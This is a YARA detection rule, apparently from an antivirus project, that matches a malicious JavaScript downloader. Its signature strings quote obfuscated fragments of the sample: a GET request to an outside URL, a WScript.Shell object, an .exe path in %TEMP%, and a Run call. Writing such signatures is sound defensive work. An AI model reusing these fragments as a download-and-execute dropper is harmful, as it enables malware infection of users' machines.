rule sig_20160401_089a3eddfba92f94fd9300dabbe7ea5e {
  meta:
    description = "datamaliciousorder - file 20160401_089a3eddfba92f94fd9300dabbe7ea5e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c35aeba1f3474e294c55df2cfe05848b29fa9d9c1f3f6b603ebb78a443dc3698"

  strings:
    $s1  = "CfRet[WtwGc](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "function LxNv(LcWar, LkuOsp){CviQk = CviQk * 1; return LcWar - LkuOsp;};" fullword ascii
    $s3  = "var KgiUuh = function MauZbv() {return WScript[VuCd](\"WScript\"+\".Shell\");}(), ZnjCha = 11;" fullword ascii
    $s4  = "if (CfRet[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DcOqe(){return UaWg + \"\";};" fullword ascii
    $s6  = "function ElEs() {return ((WlxJzj == true) && (WlxJzj == KuZv)) ? 1 : CviQk;};" fullword ascii
    $s7  = "WlxJzj = true; " fullword ascii
    $s8  = "function BfMr(IshIk) {var MhVz = (1, 2, 3, 4, 5, IshIk); return MhVz;};" fullword ascii
    $s9  = "var WlxJzj = false;" fullword ascii
    $s10 = "function NbvMm() {return KgiUuh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lCAgZy12bo.ex\" + \"e\";};" fullword ascii
    $s11 = "}while (ZiPe);" fullword ascii
    $s12 = "function UnEo()" fullword ascii
    $s13 = "var KuZv = false;" fullword ascii
    $s14 = "function UieUd(HtwJrk){KgiUuh[\"R\"+\"un\"](HtwJrk, CviQk, CviQk);};" fullword ascii
    $s15 = "var IgxXyn = false;" fullword ascii
    $s16 = "function KwEun(){return 23;};" fullword ascii
    $s17 = "KuZv = true; " fullword ascii
    $s18 = "function GsDlb(){return VuCd;};" fullword ascii
    $s19 = "var KkwYn = new this[\"Date\"]();" fullword ascii
    $s20 = "return LxNv(EyYzc, RdMjg);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}